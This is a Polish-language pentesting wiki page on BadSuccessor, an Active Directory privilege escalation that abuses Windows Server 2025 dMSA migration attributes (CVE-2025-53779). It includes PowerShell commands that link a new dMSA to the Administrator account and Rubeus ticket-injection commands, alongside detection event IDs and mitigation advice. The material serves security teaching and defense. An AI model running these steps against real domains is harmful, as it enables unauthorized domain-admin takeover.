# BadSuccessor: Eskalacja uprawnień przez nadużycie migracji Delegated MSA

{{#include ../../banners/hacktricks-training.md}}

## Przegląd

Delegated Managed Service Accounts (**dMSA**) to następcy nowej generacji **gMSA**, dostępni w systemie Windows Server 2025. Prawidłowy proces migracji pozwala administratorom zastąpić *stare* konto (użytkownika, komputera lub konto usługi) kontem dMSA, zachowując przy tym przezroczysto uprawnienia. Proces ten udostępniają polecenia cmdlet PowerShell, takie jak `Start-ADServiceAccountMigration` i `Complete-ADServiceAccountMigration`, i opiera się on na dwóch atrybutach LDAP **obiektu dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *łącze DN* do zastępowanego (starego) konta.
* **`msDS-DelegatedMSAState`**       – stan migracji (`0` = brak, `1` = w toku, `2` = *zakończona*).<sup>[[1]](#references)</sup>

Jeśli atakujący może utworzyć **dowolne** dMSA w OU i bezpośrednio zmodyfikować te 2 atrybuty, LSASS i KDC uznają dMSA za *następcę* powiązanego konta. Gdy atakujący uwierzytelni się jako dMSA, **odziedziczy wszystkie uprawnienia powiązanego konta** – aż po **Domain Admin**, jeśli powiązane zostanie konto Administratora.<sup>[[1]](#references)</sup>

Technika ta została nazwana **BadSuccessor** przez Unit 42 w 2025 roku. Microsoft później przypisał jej identyfikator **CVE-2025-53779** i opublikował aktualizację zabezpieczeń w **sierpniu 2025 roku**. Technika ta nadal ma znaczenie w niezałatanych środowiskach Windows Server 2025 oraz podczas przeglądu niebezpiecznej delegacji uprawnień do OU.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

Na załatanych kontrolerach domeny [dwustronna migracja dMSA](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch) może nadal ujawnić konto docelowe, jeśli atakujący może również zapisywać jego atrybuty migracji. Jest to węższy wariant niż pierwotny atak na dowolne konto docelowe.

### Wymagania wstępne ataku

1. Konto, które *może* tworzyć obiekty w **jednostce organizacyjnej (OU)** *i* ma co najmniej jedno z następujących uprawnień:
   * `Create Child` → klasa obiektu **`msDS-DelegatedManagedServiceAccount`**
   * `Create Child` → **`All Objects`** (ogólne uprawnienie do tworzenia obiektów)
2. Łączność sieciowa z LDAP i Kerberos (standardowy scenariusz z komputerem przyłączonym do domeny / atak zdalny).<sup>[[1]](#references)</sup>

## Enumerowanie podatnych OU

Unit 42 opublikowało skrypt pomocniczy PowerShell, który analizuje deskryptory zabezpieczeń każdej OU i wskazuje wymagane ACE:<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

W tle skrypt wykonuje stronicowane wyszukiwanie LDAP dla `(objectClass=organizationalUnit)` i sprawdza każdy `nTSecurityDescriptor` pod kątem

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (klasa obiektu *msDS-DelegatedManagedServiceAccount*)

## Kroki eksploatacji

Po zidentyfikowaniu zapisywalnego OU do przeprowadzenia ataku wystarczą 3 operacje zapisu LDAP:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Po replikacji atakujący może po prostu **zalogować się** jako `attacker_dMSA$` lub zażądać biletu Kerberos TGT – Windows utworzy token *zastąpionego* konta.<sup>[[1]](#references)</sup>

### Automatyzacja

Kilka publicznych PoC obejmuje cały proces, w tym pobieranie hasła i zarządzanie biletami:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* Moduł NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Wykrywanie i poszukiwanie

Włącz **audyt obiektów** w jednostkach organizacyjnych (OU) i monitoruj następujące zdarzenia zabezpieczeń Windows:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – utworzenie obiektu **dMSA**
* **5136** – modyfikacja atrybutu **`msDS-ManagedAccountPrecededByLink`**
* **4662** – zmiany określonych atrybutów
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – wydanie TGT dla dMSA

Skorelowanie zdarzeń `4662` (modyfikacja atrybutu), `4741` (utworzenie konta komputera/usługi) i `4624` (późniejsze logowanie) szybko pomaga wykryć aktywność BadSuccessor. Rozwiązania XDR, takie jak **XSIAM**, oferują gotowe zapytania (zob. odnośniki).<sup>[[2]](#references)</sup>

## Ograniczanie ryzyka

* Zainstaluj aktualizację zabezpieczeń Microsoft dla **CVE-2025-53779** i sprawdź poziom poprawek na każdym kontrolerze domeny Windows Server 2025.<sup>[[6]](#references)</sup>
* Stosuj zasadę **najmniejszych uprawnień** – deleguj zarządzanie *kontami usługowymi* wyłącznie zaufanym rolom.
* Usuń uprawnienie `Create Child` / `msDS-DelegatedManagedServiceAccount` z jednostek OU, które go wyraźnie nie wymagają.
* Monitoruj wymienione powyżej identyfikatory zdarzeń i generuj alerty, gdy tożsamości spoza *Tier-0* tworzą lub edytują obiekty dMSA.

## Zobacz także


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: nadużywanie dMSA w celu eskalacji uprawnień w Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – gdy dobre konta stają się złe: wykorzystywanie delegowanych kont usług zarządzanych](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [Moduł BadSuccessor NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
